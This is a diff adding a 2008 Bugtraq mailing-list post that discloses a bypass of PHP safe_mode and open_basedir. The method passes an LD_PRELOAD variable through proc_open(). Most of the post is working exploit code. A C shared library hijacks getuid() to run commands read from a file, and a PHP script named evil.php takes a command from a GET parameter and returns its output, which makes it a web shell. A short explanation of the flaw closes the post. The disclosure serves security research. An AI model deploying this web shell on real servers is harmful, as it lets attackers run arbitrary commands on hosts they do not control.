@@ -1,0 +1,97 @@
+
+Date: 9 Dec 2008 07:52:55 -0000
+From: gat3way@...3way.eu
+To: bugtraq@...urityfocus.com
+Subject: PHP safe_mode can be bypassed via proc_open() and custom environment.
+
+This *should* work provided that you have met the following requirements:
+
+1) A writable directory under documentroot to place those files (obviously)
+2) You don't have proc_open in your disabled_functions list
+3) You are able to compile a shared library on the same platform as the target web server.
+
+
+Here is the library code, compile with cc -o a.so -fPIC -shared a.c
+
+a.c:
+----
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+int getuid()
+{
+char *en;
+char *buf=malloc(300);
+FILE *a;
+
+unsetenv("LD_PRELOAD");
+a=fopen(".comm","r");
+buf=fgets(buf,100,a);
+write(2,buf,strlen(buf));
+fclose(a);
+rename("a.so","b.so");
+system(buf);
+system("mv output.txt .comm1");
+rename("b.so","a.so");
+free(buf);
+return 0;
+}
+
+*cut*
+
+
+And that is the PHP script:
+
+evil.php:
+-------------------------
+<?php
+
+$path="/var/www"; //change to your writable path
+
+
+$a=fopen($path."/.comm","w");
+fputs($a,$_GET["c"]);
+fclose($a);
+
+$descriptorspec = array(
+ 0 => array("pipe", "r"),
+ 1 => array("file", $path."/output.txt","w"),
+ 2 => array("file", $path."/errors.txt", "a" )
+);
+
+$cwd = '.';
+$env = array('LD_PRELOAD' => $path."/a.so");
+$process = proc_open('examplecommand', $descriptorspec, $pipes, $cwd, $env); // example command - should not succeed
+
+
+sleep(1);
+$a=fopen($path."/.comm1","r");
+
+echo "<pre><b>";
+while (!feof($a))
+{$b=fgets($a);echo $b;}
+fclose($a);
+echo "</pre>";
+
+?>
+
+
+Why does that work?
+-------------------
+
+Because the PHP devs like to trust the environment. Especially the dynamic loader variables. 
+
+If you have safe_mode enabled, you cannot execute anything except the binaries in the safe mode exec dir. They prepend a trailing slash to your command string and strip "..". Yet, proc_open() enables you to provide your own environment to pass to the new process. proc_open() executes "/bin/sh -c yourcommand" and even though "yourcommand" is invalid, the LD_PRELOAD variable is passed to /bin/sh.
+
+Then /bin/sh loads your "evil" library and then you can easily execute other commands, open files, etc, etc.
+
+
+The library in question overloads getuid() in a way that it takes input from a text file, executes it and writes the output into another text file. 
+
+This also works against open_basedir restrictions since the library can be under the documentroot.
+
+The only tough thing from an attacker's perspective is to compile the library on the same platform as the attacked system.
+
+And it works on linux only..
+
